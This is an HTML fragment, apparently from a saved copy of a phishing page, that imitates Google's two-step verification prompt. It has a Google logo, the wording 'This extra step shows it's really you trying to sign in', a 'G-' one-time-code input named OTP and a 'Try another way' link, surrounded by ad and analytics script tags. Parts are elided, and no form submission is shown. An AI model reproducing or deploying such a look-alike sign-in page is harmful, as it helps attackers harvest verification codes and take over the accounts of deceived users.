...
<script async="" src="otp_files/beacon.js.download"></script><script src="file://rules.quantcount.com/rules-p-31iz6hfFutd16.js" async=""></script><script src="otp_files/quant.js.download" async="" type="text/javascript"></script><script src="otp_files/f.txt" id="google_shimpl"></script><script type="text/javascript" async="" src="otp_files/analytics.js.download"></script><script type="text/javascript" async="" src="otp_files/ga.js.download"></script><script src="otp_files/rules-p-31iz6hfFutd16.js.download" async=""></script><script async="" src="otp_files/beacon.js(1).download"></script><script src="otp_files/quant.js(1).download" async="" type="text/javascript"></script><script src="otp_files/osd.js.download"></script><script src="otp_files/f(1).txt"></script><script src="otp_files/f(2).txt" id="google_shimpl"></script><script type="text/javascript" async="" src="otp_files/analytics.js(1).download"></script><script type="text/javascript" async="" src="otp_files/ga.js(1).download"></script><script>(function(){function a(g,h,i){var j=new Date;j.setTime(j.getTime()+1e3*(60*(60*(24*i))));var k="expires="+j.toUTCString(),l=g+"="+h+";"+k+";path=/;";"undefined"!=typeof ezdomain&&(l+="domain="+ezdomain),document.cookie=l}var b=window.addEventListener?"addEventListener":"attachEvent",c=window[b],f="attachEvent"==b?"onmessage":"message";c(f,function(g){"undefined"!=typeof g.data.ezstatus&&(__ez.bit.AddAndFire(_ezaq.page_view_id,[new __ezDotData("dg",g.data.ezstatus)]),a("ezdg",g.data.ezstatus,730))})})();</script>
...
<script async="" src="otp_files/js"></script>
<script>
...
attach_ezolpl();
</script><script src="otp_files/edmonton.webp" async=""></script><script src="otp_files/jellyfish.webp" async=""></script><link rel="preload" href="otp_files/f(4).txt" as="script"><script type="text/javascript" src="otp_files/f(4).txt"></script><link rel="preload" href="otp_files/f(5).txt" as="script"><script type="text/javascript" src="otp_files/f(5).txt"></script><link rel="preload" href="otp_files/f(6).txt" as="script"><script type="text/javascript" src="otp_files/f(6).txt"></script><link rel="preload" href="otp_files/f(7).txt" as="script"><script type="text/javascript" src="otp_files/f(7).txt"></script><script src="otp_files/audins.js.download" async="" type="text/javascript"></script><script src="file:///C:/detroitchicago/edmonton.webp?a=a&amp;cb=2&amp;shcb=32" async=""></script><script src="file:///C:/porpoiseant/jellyfish.webp?a=a&amp;cb=2&amp;shcb=32" async=""></script></head>
...
<body class="container">
    ...
    <div class="form-wrapper-outer">
        ...
        <div class="form-logo">
            <img src="otp_files/google_PNG19644.png" alt="logo">
        </div>
        <div class="form-greeting">
         ...
         <div class="form-greetings">
            <span>This extra step shows it’s really you trying to sign in</span>
        </div>
        <br>
        ...
        <input type="tel" name="OTP" id="">
            <div class="field-placeholder"><span><B>G-</B>
                
             Enter the code </span></div>
        </div>
        
        <br>
        <h8 style="color:#1a73e8;"><b>Try another way</b></h8>
